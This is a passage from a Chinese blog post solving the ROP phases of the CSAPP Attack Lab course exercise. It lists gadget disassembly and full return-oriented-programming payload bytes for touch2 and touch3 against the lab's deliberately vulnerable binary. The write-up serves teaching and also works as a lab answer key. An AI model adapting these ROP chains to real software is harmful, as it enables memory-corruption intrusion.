+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax</span><br><span class="line">  40199f:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; mov %rax, %rdi</span><br><span class="line">; ret</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; popq %rax</span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq</span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:	c3                   	retq</span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:	c3                   	retq</span><br><span class="line"></span><br><span class="line">00000000004019bc &lt;setval_470&gt;:</span><br><span class="line">  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4019c2:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; mov %rax, %rdi</span><br><span class="line">; nop</span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; popq %rax</span><br><span class="line">; nop</span><br><span class="line">; ret (near)</span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3                   	retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们找到<code>popq %rax</code>(<code>0x4019ab</code>)和<code>mov %rax, %rdi</code>(<code>0x4019a2</code>)这种相当有用的指令，因此把栈做如下编排：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...                           # 40 useless bytes</span><br><span class="line">ab 19 40 00 00 00 00 00       # popq %rax</span><br><span class="line">fa 97 b9 59 00 00 00 00       # cookie</span><br><span class="line">a2 19 40 00 00 00 00 00       # mov %rax, %rdi</span><br><span class="line">ec 17 40 00 00 00 00 00       # touch2()</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-touch3"><a href="#2-touch3" class="headerlink" title="2. touch3()"></a>2. touch3()</h3><p>最初打算直接使用%rsp 来充当字符串的地址，但是这样的话实在没有合适的指令让%rsp 往下跳……看了亿眼别人的答案，才发现可以让%rsp 加上一个偏移量，寄寄寄（</p>
+<p>偏移量怎么加呢？我们看看<code>farm.c</code>(只截取有用的 gadget)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">; mov %rax, %rdi</span><br><span class="line">; nop</span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; performs &quot;%rax = %rdi + %rsi&quot;</span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; mov %rsp, %rax</span><br><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; mov %ecx, %esi</span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; mov %ecx, %esi</span><br><span class="line">0000000000401a25 &lt;addval_187&gt;:</span><br><span class="line">  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax</span><br><span class="line">  401a2b:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; mov %edx, %ecx</span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax</span><br><span class="line">  401a38:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; mov %esp, %eax</span><br><span class="line">0000000000401a39 &lt;addval_110&gt;:</span><br><span class="line">  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax</span><br><span class="line">  401a3f:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; mov %eax, %edx</span><br><span class="line">; testb</span><br><span class="line">0000000000401a40 &lt;addval_487&gt;:</span><br><span class="line">  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">  401a46:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; mov %edx, %ecx</span><br><span class="line">; orb %bl</span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; mov %rsp, %rax</span><br><span class="line">; but it can&#x27;t be used</span><br><span class="line">0000000000401a97 &lt;setval_181&gt;:</span><br><span class="line">  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)</span><br><span class="line">  401a9d:	c3                   	retq</span><br><span class="line"></span><br><span class="line">; mov %rsp, %rax</span><br><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:	c3                   	retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们发现有一个特别的函数<code>add_xy()</code>可以直接把<code>%rdi</code>和<code>%rsi</code>相加，放到<code>%rax</code>上；我们还发现有几个寄存器可供我们倒腾：<code>%ecx</code>、<code>%edx</code>、<code>%rsi</code>、<code>%rdi</code>、<code>%rax</code>。</p>
+<p>我们先写出一个骨架：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">; calculate offset</span><br><span class="line">...</span><br><span class="line">; after that, the offset is put in %rax</span><br><span class="line"></span><br><span class="line">; put offset into %rsi</span><br><span class="line">mov %eax, %edx</span><br><span class="line">mov %edx, %ecx</span><br><span class="line">mov %ecx, %esi</span><br><span class="line"></span><br><span class="line">; main</span><br><span class="line">mov %rsp, %rax</span><br><span class="line">mov %rax, %rdi</span><br><span class="line">add_xy()</span><br><span class="line">mov %rax, %rdi</span><br><span class="line">call touch3()</span><br><span class="line">&lt;cookie string&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在这里，偏移量显然是<code>mov %rsp, %rax</code>和<code>&lt;cookie string&gt;</code>的距离，但是中间其实还可以填充一些相当于<code>nop</code>的东西。我们还发现，<code>getbuf()</code>的返回值是 1，这表明<code>%rax</code>在攻击开始时一定是 1。</p>
+<p>我的做法还是比较逆天：不断倍增这个 1。结果相当长。</p>
+<p>倍增是这样的(<code>%rax -&gt; %rdx -&gt; %rcx -&gt; %rsi, %rax -&gt; %rdi, add_xy()</code>)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov %eax, %edx</span><br><span class="line">mov %edx, %ecx</span><br><span class="line">mov %ecx, %esi</span><br><span class="line">mov %rax, %rdi</span><br><span class="line">add_xy()</span><br></pre></td></tr></table></figure>
+
+<p>如果是倍增，最后的偏移量需要是$2^n$，可能需要填充一些相当于<code>nop</code>的指令。不过这里不需要。</p>
+<p>最终结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># useless bytes (40 bytes)</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">64 64 64 64 64 64 64 64</span><br><span class="line">65 65 65 65 65 65 65 65</span><br><span class="line"></span><br><span class="line"># double(x5)</span><br><span class="line">42 1a 40 00 00 00 00 00  # mov %eax, %edx</span><br><span class="line">34 1a 40 00 00 00 00 00  # mov %edx, %ecx</span><br><span class="line">27 1a 40 00 00 00 00 00  # mov %ecx, %esi</span><br><span class="line">c5 19 40 00 00 00 00 00  # mov %rax, %rdi</span><br><span class="line">d6 19 40 00 00 00 00 00  # add_xy()</span><br><span class="line"></span><br><span class="line">42 1a 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">27 1a 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line"></span><br><span class="line">42 1a 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">27 1a 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line"></span><br><span class="line">42 1a 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">27 1a 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line"></span><br><span class="line">42 1a 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">27 1a 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line"></span><br><span class="line"># main</span><br><span class="line">42 1a 40 00 00 00 00 00  # mov %eax, %edx</span><br><span class="line">34 1a 40 00 00 00 00 00  # mov %edx, %ecx</span><br><span class="line">27 1a 40 00 00 00 00 00  # mov %ecx, %esi</span><br><span class="line">ad 1a 40 00 00 00 00 00  # mov %rsp, %rax</span><br><span class="line">c5 19 40 00 00 00 00 00  # mov %rax, %rdi</span><br><span class="line">d6 19 40 00 00 00 00 00  # add_xy()</span><br><span class="line">c5 19 40 00 00 00 00 00  # mov %rax, %rdi</span><br><span class="line">fa 18 40 00 00 00 00 00  # call touch3()</span><br><span class="line">35 39 62 39 39 37 66 61  # &lt;cookie string&gt;</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>太好玩辣！</p>
+<p><img src="/asterich_blog/2022/12/16/CSAPP-Attack-Lab/image/%E5%B1%80%E5%BA%A7.jpg"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/C/" rel="tag"># C</a>
+              <a href="/tags/Assembly/" rel="tag"># Assembly</a>
+              <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" rel="tag"># 计算机体系结构</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/15/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" rel="prev" title="第一篇博客">
+      <i class="fa fa-chevron-left"></i> 第一篇博客
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/12/17/%E6%91%87%E6%9B%B3%E9%9C%B2%E8%90%A5%E5%89%A7%E5%9C%BA%E7%89%88/" rel="next" title="摇曳露营剧场版">
+      摇曳露营剧场版 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">前置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">第一部分 代码注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-touch1"><span class="nav-number">2.1.</span> <span class="nav-text">1. touch1()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-touch2"><span class="nav-number">2.2.</span> <span class="nav-text">2. touch2()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-touch3"><span class="nav-number">2.3.</span> <span class="nav-text">3. touch3()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-Return-Oriented-Programming"><span class="nav-number">3.</span> <span class="nav-text">第二部分 Return-Oriented Programming</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-touch2"><span class="nav-number">3.1.</span> <span class="nav-text">1. touch2()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-touch3"><span class="nav-number">3.2.</span> <span class="nav-text">2. touch3()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">asterich</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/asterich" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;asterich" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">asterich</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'rMXVJ5iH2WpSp9Zn7XI7V6fv-gzGzoHsz',
+      appKey     : 'QcmRVR4qNUvwLfvG1r6UMf42',
+      placeholder: "enter your comment here",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
